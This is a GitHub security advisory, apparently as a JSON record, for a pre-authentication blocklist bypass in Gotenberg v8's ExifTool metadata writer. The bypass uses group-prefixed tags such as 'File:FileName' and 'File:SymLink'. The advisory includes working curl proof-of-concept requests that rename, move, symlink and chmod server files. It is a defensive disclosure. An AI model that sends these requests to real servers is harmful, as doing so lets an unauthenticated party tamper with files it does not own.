{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/74617774?v=4", "events_url": "https://api.github.com/users/JohannesLks/events{/privacy}", "followers_url": "https://api.github.com/users/JohannesLks/followers", "following_url": "https://api.github.com/users/JohannesLks/following{/other_user}", "gists_url": "https://api.github.com/users/JohannesLks/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/JohannesLks", "id": 74617774, "login": "JohannesLks", "node_id": "MDQ6VXNlcjc0NjE3Nzc0", "organizations_url": "https://api.github.com/users/JohannesLks/orgs", "received_events_url": "https://api.github.com/users/JohannesLks/received_events", "repos_url": "https://api.github.com/users/JohannesLks/repos", "site_admin": false, "starred_url": "https://api.github.com/users/JohannesLks/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/JohannesLks/subscriptions", "type": "User", "url": "https://api.github.com/users/JohannesLks", "user_view_type": "public"}}], "cve_id": "CVE-2026-42590", "cvss": {"score": 8.2, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L"}, "cvss_severities": {"cvss_v3": {"score": 8.2, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-184", "name": "Incomplete List of Disallowed Inputs"}], "description": "**Summary**

The ExifTool metadata write blocklist in Gotenberg v8 can be bypassed using ExifTool's group-prefix syntax, enabling arbitrary file rename, move, hardlink, and symlink creation on the server. This is a bypass of the fix for GHSA-qmwh-9m9c-h36m.

**Details**

The blocklist in `pkg/modules/exiftool/exiftool.go` filters four dangerous pseudo-tags (`FileName`, `Directory`, `HardLink`, `SymLink`) using `strings.EqualFold(key, tag)`. However, ExifTool supports group-prefix syntax where `File:FileName` is processed identically to `FileName` -- the prefix is stripped by `SetNewValue` in `Writer.pl` before tag matching.

The `safeKeyPattern` regex (`^[a-zA-Z0-9\-_.:]+$`) allows colons, so prefixed tag names pass validation. Any prefix works: `File:FileName`, `System:Directory`, `a:HardLink`, etc.

Additionally, `FilePermissions`, `FileUserID`, and `FileGroupID` pseudo-tags are not blocked at all and can modify file attributes without any prefix.

**PoC**

```bash
# Rename the converted PDF (bypasses FileName blocklist)
curl -F "files=@test.pdf" \
  -F 'metadata={"File:FileName":"pwned.pdf"}' \
  http://localhost:3000/forms/pdfengines/metadata/write

# Move the file to /tmp (bypasses Directory blocklist)
curl -F "files=@test.pdf" \
  -F 'metadata={"File:Directory":"/tmp"}' \
  http://localhost:3000/forms/pdfengines/metadata/write

# Create a symlink (bypasses SymLink blocklist)
curl -F "files=@test.pdf" \
  -F 'metadata={"File:SymLink":"/tmp/symlink-poc"}' \
  http://localhost:3000/forms/pdfengines/metadata/write

# Change file permissions (not blocked at all)
curl -F "files=@test.pdf" \
  -F 'metadata={"FilePermissions":"rwxrwxrwx"}' \
  http://localhost:3000/forms/pdfengines/metadata/write
```

**Impact**

Pre-auth (no authentication by default). Attacker can rename, move, or create links to files within the Gotenberg container. In deployments with mounted volumes or non-containerized setups, this enables arbitrary file read via symlink chaining and file overwrite via directory manipulation.

This is a direct bypass of the fix for GHSA-qmwh-9m9c-h36m.", "epss": {"percentage": 0.0029, "percentile": 0.20527}, "ghsa_id": "GHSA-7v3r-m9c8-r855", "github_reviewed_at": "2026-05-07T00:55:44Z", "html_url": "https://github.com/advisories/GHSA-7v3r-m9c8-r855", "identifiers": [{"type": "GHSA", "value": "GHSA-7v3r-m9c8-r855"}, {"type": "CVE", "value": "CVE-2026-42590"}], "nvd_published_at": "2026-05-14T16:16:22Z", "published_at": "2026-05-07T00:55:44Z", "references": ["https://github.com/gotenberg/gotenberg/security/advisories/GHSA-7v3r-m9c8-r855", "https://github.com/advisories/GHSA-qmwh-9m9c-h36m", "https://nvd.nist.gov/vuln/detail/CVE-2026-42590", "https://github.com/advisories/GHSA-7v3r-m9c8-r855"], "repository_advisory_url": "https://api.github.com/repos/gotenberg/gotenberg/security-advisories/GHSA-7v3r-m9c8-r855", "severity": "high", "source_code_location": "https://github.com/gotenberg/gotenberg", "summary": "Gotenberg's ExifTool group-prefix syntax bypasses dangerous-tag blocklist", "type": "reviewed", "updated_at": "2026-05-14T20:52:17Z", "url": "https://api.github.com/advisories/GHSA-7v3r-m9c8-r855", "vulnerabilities": [{"first_patched_version": null, "package": {"ecosystem": "go", "name": "github.com/gotenberg/gotenberg/v8"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 8.29.1"}], "withdrawn_at": null}

title: Gotenberg's ExifTool group-prefix syntax bypasses dangerous-tag blocklist
